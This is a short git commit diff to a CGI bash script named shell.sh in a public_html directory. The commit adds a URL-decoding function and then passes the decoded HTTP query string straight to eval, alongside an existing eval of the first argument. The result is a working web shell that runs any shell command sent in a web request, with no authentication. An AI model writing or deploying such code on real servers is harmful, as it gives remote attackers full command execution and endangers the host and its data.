e9014b6f3819104db160f9c4f18d187052304108
Israel Roldan <israel.alberto.rv@gmail.com>
2020-09-26 05:33:40 -0500

    Added a decode URL function in the shell script.
    Signed-off-by: Israel Roldan <israel.alberto.rv@gmail.com>

--- public_html/shell.sh
+++ public_html/shell.sh
@@ -1,9 +1,16 @@
 #!/bin/bash
 echo "Content-type: text/plain"
 echo ""
+function urlDecode() {
+  : "${*//+/ }"
+  echo -e "${_//%/\\x}"
+}
 set -exv
-echo "1: ${1}"
-echo "QUERY_STRING: $QUERY_STRING"
+COMMAND=$(urlDecode "${QUERY_STRING}")
+echo "Argument #1:  ${1}"
+echo "QUERY_STRING: ${QUERY_STRING}"
+echo "COMMAND:      ${COMMAND}"
 echo ""
-# Comment
 eval "${1}" 2>&1
+echo ""
+eval "${COMMAND}" 2>&1
